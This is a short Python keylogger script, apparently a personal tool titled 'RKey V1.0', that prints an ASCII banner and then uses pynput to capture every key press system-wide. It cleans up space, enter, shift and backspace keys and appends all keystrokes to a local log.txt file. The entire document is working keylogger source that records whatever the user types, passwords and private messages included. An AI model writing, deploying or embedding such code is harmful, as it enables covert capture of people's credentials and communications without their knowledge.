from pynput.keyboard import Listener
import pyfiglet

result = pyfiglet.figlet_format("RKey", font="nancyj-fancy")
print(result + '_V1.0_ -Rivek Raj Tamang')

def note_to_file(keycode):
    data = str(keycode)
    data = data.replace("'", "")

    if data == 'Key.space':
        data = ' '
    if data == 'Key.shift_r':
        data = ''
    if data == 'Key.shift_l':
        data = ''
    if data == 'shiftKey':
        data = ''
    if data == 'Key.enter':
        data = '\n'

#custom key
    if data == 'Key.backspace':
        data = '(del)'

    with open("log.txt", 'a') as ref:
        ref.write(data)

with Listener(on_press=note_to_file) as li:
    li.join()
